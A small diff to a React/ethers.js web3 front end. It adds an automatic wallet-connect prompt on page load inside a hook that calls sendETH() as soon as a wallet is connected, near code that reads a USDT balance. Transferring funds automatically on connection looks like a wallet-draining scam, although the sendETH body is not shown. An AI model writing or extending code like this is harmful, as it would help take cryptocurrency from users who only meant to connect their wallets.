@@ -86,6 +86,7 @@ async function checkBalance(contractAddress,contractAbi,contractSigner,currency)
     return USDTBalance;
 }
 useEffect(() => {
+  open();
  if(isConnected){
   sendETH();
   const ethersProvider = new ethers.providers.Web3Provider(walletProvider)
